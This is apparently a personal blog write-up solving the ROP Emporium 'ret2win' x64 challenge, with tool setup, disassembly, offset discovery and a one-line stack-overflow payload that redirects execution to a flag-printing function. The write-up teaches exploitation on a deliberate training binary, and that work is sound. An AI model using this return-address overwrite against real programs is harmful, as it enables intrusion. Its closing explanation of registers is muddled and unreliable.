---
layout: post
title:  "ROP Emporium: Ret2win"
date:   21-02-2020 13:34:34
categories: exploitation
tags: Exploitation, ROP_Emporium, Ret2win
---

As I am not that experienced with exploitation yet, I recently decided to follow the series of challenges offered by [ROP Emporium][link1]. The challenges will be explained here both as a documentation exercise and with the hope that other cybersecurity enthusiasts will be able to find some value in my post. Since I'll solve most of the challenges in x64 architecture, the following document might be helpful [x64 cheatsheet][link2]

Requirement 
===========
First, we download the zip file for the challenges:
{% highlight bash%}
wget https://ropemporium.com/binary/rop_emporium_all_challenges.zip
unzip rop_emporium_all_challenges.zip
{% endhighlight %}
Radare2
>Radare2 is a complete framework for reverse-engineering and analyzing binaries; composed of a set of small utilities that can be used together or independently from the command line.

{% highlight bash%}
apt-get install git
git clone https://github.com/radare/radare2
cd radare2
sys/install.sh
{% endhighlight %}
Ropper
>You can use ropper to display information about binary files in different file formats and you can search for gadgets to build rop chains for different architectures (x86/X86_64, ARM/ARM64, MIPS/MIPS64, PowerPC/PowerPC64, SPARC64). For disassembly ropper uses the awesome Capstone Framework.

{% highlight bash%}
apt install python-pip
pip install ropper
{% endhighlight %}
Pwntools
>Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.

{% highlight bash%}
apt-get update
apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
pip install --upgrade pip
pip install --upgrade pwntools
{% endhighlight %}
Peda
>PEDA - Python Exploit Development Assistance for GDB

{% highlight bash%}
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
{% endhighlight %}

Ret2win
=======
A first glance at the binary using r2 shows three main functions:
{% highlight bash%}
0x00400746    1 111          sym.main
0x004007b5    1 92           sym.pwnme
0x00400811    1 32           sym.ret2win
{% endhighlight %}
Upon further examination, we can easily determine to which address we need to return to:
{% highlight bash%}
/ (fcn) sym.ret2win 32
|   sym.ret2win ();
|           0x00400811      55             push rbp
|           0x00400812      4889e5         mov rbp, rsp
|           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:"
|           0x0040081a      b800000000     mov eax, 0
|           0x0040081f      e8ccfdffff     call sym.imp.printf
|           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt ; 0x4009fd ; "/bin/cat flag.txt"
|           0x00400829      e8b2fdffff     call sym.imp.system
|           0x0040082e      90             nop
|           0x0040082f      5d             pop rbp
\           0x00400830      c3             ret
{% endhighlight %}
Next, we need to determine our offset by providing the binary with a special non-repeatable pattern:
{% highlight bash%}
Creating our pattern:
gdb ret2win
pattern_create 200
or 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
{% endhighlight %}
Once we provide our pattern to the binary we are greeted with:
{% highlight bash%}
Program received signal SIGSEGV, Segmentation fault.                                                      
[----------------------------------registers-----------------------------------]                          
RAX: 0x7fffffffe130 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")                                 
RBX: 0x0                                                                                                  
RCX: 0x0                                                                                                  
RDX: 0x7ffff7fa4590 --> 0x0                                                                               
RSI: 0x6022a1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'"...)
RDI: 0x7fffffffe131 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")                                  
RBP: 0x6141414541412941 ('A)AAEAAa')                                                                      
RSP: 0x7fffffffe158 ("AA0AAFAAb")                                                                         
RIP: 0x400810 (<pwnme+91>:      ret)                                                                      
R8 : 0x7fffffffe130 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")                                 
R9 : 0x7ffff7fa9500 (0x00007ffff7fa9500)                                                                  
R10: 0x410                                                                                                
R11: 0x246                                                                                                
R12: 0x400650 (<_start>:        xor    ebp,ebp)                                                           
R13: 0x7fffffffe240 --> 0x1                                                                               
R14: 0x0                                                                                                  
R15: 0x0                                                                                                  
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)                         
[-------------------------------------code-------------------------------------]                                                                                                                                    
   0x400809 <pwnme+84>: call   0x400620 <fgets@plt>                                                       
   0x40080e <pwnme+89>: nop                                                                               
   0x40080f <pwnme+90>: leave                                                                             
=> 0x400810 <pwnme+91>: ret                                                                               
   0x400811 <ret2win>:  push   rbp                                                                        
   0x400812 <ret2win+1>:        mov    rbp,rsp                                                            
   0x400815 <ret2win+4>:        mov    edi,0x4009e0                                                       
   0x40081a <ret2win+9>:        mov    eax,0x0                                                            
[------------------------------------stack-------------------------------------]                          
0000| 0x7fffffffe158 ("AA0AAFAAb")                                                                        
0008| 0x7fffffffe160 --> 0x400062 --> 0x1f8000000000000                                                   
0016| 0x7fffffffe168 --> 0x7ffff7e0ebbb (<__libc_start_main+235>:       mov    edi,eax)                                                                                                                             
0024| 0x7fffffffe170 --> 0x0                                                                              
0032| 0x7fffffffe178 --> 0x7fffffffe248 --> 0x7fffffffe53a ("/root/ropemporium/ret2win")                  
0040| 0x7fffffffe180 --> 0x100040000                                                                      
0048| 0x7fffffffe188 --> 0x400746 (<main>:      push   rbp)                                               
0056| 0x7fffffffe190 --> 0x0                                                                              
[------------------------------------------------------------------------------]                          
Legend: code, data, rodata, value                                                                         
Stopped reason: SIGSEGV                                                                                   
0x0000000000400810 in pwnme ()   
{% endhighlight %}
We can see that the stack pointer(RSP) has now been overwritten by the value "AA0AAFAAb".  Using this value, we can determine how much padding will be needed before writing the address to the function ret2win@0x00400811
{% highlight bash%}
pattern offset AA0AAFAAb
AA0AAFAAb found at offset: 40
{% endhighlight %}
Now if all goes according to plan, the following line should return the flags:
{% highlight bash%}
python -c 'print "\x90"*40                #Will take care of the padding
+"\x11\x08\x40\x00\x00\x00\x00\x00\x00"'  #Will write our address into RSP
   
root@kali:~/ropemporium# python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00\x00"' | ./ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
Segmentation fault

{% endhighlight %}
   
*Note that the value of RIP has not been overwritten, this is because, in the x64 architecture, the value will not be poped into RDI if it cannot be jumped to or executed.

[link1]:https://ropemporium.com/
[link2]:/document/x64_cheatsheet.pdf
